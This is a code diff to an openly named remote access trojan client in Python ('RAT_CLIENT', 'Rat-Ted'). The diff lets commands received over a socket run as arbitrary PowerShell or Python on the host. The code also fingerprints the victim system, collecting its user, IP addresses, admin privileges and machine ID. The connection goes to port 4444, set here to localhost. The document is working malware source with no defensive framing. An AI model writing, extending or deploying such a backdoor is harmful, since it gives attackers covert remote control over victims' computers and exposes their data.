@@ -45,6 +45,7 @@ class RAT_CLIENT:
         self.host = host
         self.port = port
         self.curdir = os.getcwd()
+        self.command_history = []
 
     def build_connection(self):
         global s
@@ -96,7 +97,7 @@ class RAT_CLIENT:
     def gather_info(self):
         # Get the information about the system
         info = str(
-            f"System:{platform.platform()} {platform.win32_edition()}|Version: {platform.version()}|Architecture:{platform.architecture()}|Name of Computer:{platform.node()}|Processor:{platform.processor()}|Python:{platform.python_version()}|User:{os.getlogin()}|IPv4:{socket.gethostbyname(socket.gethostname())}|IPv6:{socket.gethostbyname_ex(socket.gethostname())[2][0]}|Uptime:{datetime.now() - datetime.fromtimestamp(psutil.boot_time())}|Privileges:{ctypes.windll.shell32.IsUserAnAdmin()}|Bit:{platform.machine()}|Rat-Ted-Version:1.0.0|ID:{uuid.getnode()}")
+            f"System:{platform.platform()} {platform.win32_edition()}|Version: {platform.version()}|Architecture:{platform.architecture()}|Name:{platform.node()}|Processor:{platform.processor()}|Python:{platform.python_version()}|User:{os.getlogin()}|IPv4:{socket.gethostbyname(socket.gethostname())}|IPv6:{socket.gethostbyname_ex(socket.gethostname())[2][0]}|Uptime:{datetime.now() - datetime.fromtimestamp(psutil.boot_time())}|Privileges:{ctypes.windll.shell32.IsUserAnAdmin()}|Bit:{platform.machine()}|Rat-Ted-Version:1.0.0|ID:{uuid.getnode()}")
 
         return info
 
@@ -104,18 +105,46 @@ class RAT_CLIENT:
         # Access the powershell commands
 
         while True:
-            command = s.recv(1024).decode()
+            command = s.recv(100024).decode()
+
+            # Command should include: powershell:<command>
+            # Example: powershell:ipconfig
+
+            # This is used so in the future we can do things such as we're getting this:
+            # python:<command>
+
+            # So that we can use avaliable langauges to execute commands
 
             try:
+
+                print(command)
+
+                # Only split once
+                command = command.split("|", 1)
+                command_type = command[0].split("command_type")[
+                    1].replace(":", "")
+                command_cmd = command[1].split("command")[1].replace(":", "")
                 # Run the command in the shell and capture the output
-                output = subprocess.check_output(
-                    ["powershell.exe", "-Command", command],
-                    stderr=subprocess.STDOUT,
-                    shell=True,
-                    text=True
-                ).strip()
+                if command_type == "python":
+                    output = subprocess.check_output(
+                        ["python", "-c", command_cmd],
+                        stderr=subprocess.STDOUT,
+                        shell=True,
+                        text=True
+                    ).strip()
+
+                else:
+                    output = subprocess.check_output(
+                        ["powershell.exe", "-Command",
+                            command_cmd],
+                        stderr=subprocess.STDOUT,
+                        shell=True,
+                        text=True
+                    ).strip()
+
             except subprocess.CalledProcessError as e:
                 output = str(e.output)
+
             s.send(output.encode())
 
 #     def execute(self):
@@ -300,7 +329,7 @@ class RAT_CLIENT:
 #                 sysinfo = str(f'''
 # System: {platform.platform()} {platform.win32_edition()}
 # Architecture: {platform.architecture()}
-# Name of Computer: {platform.node()}
+# Name: {platform.node()}
 # Processor: {platform.processor()}
 # Python: {platform.python_version()}
 # Java: {platform.java_ver()}
@@ -671,7 +700,7 @@ class RAT_CLIENT:
 #                 break
 
 
-rat = RAT_CLIENT('127.0.0.1', 4444)
+rat = RAT_CLIENT('localhost', 4444)
 
 if __name__ == '__main__':
     rat.build_connection()
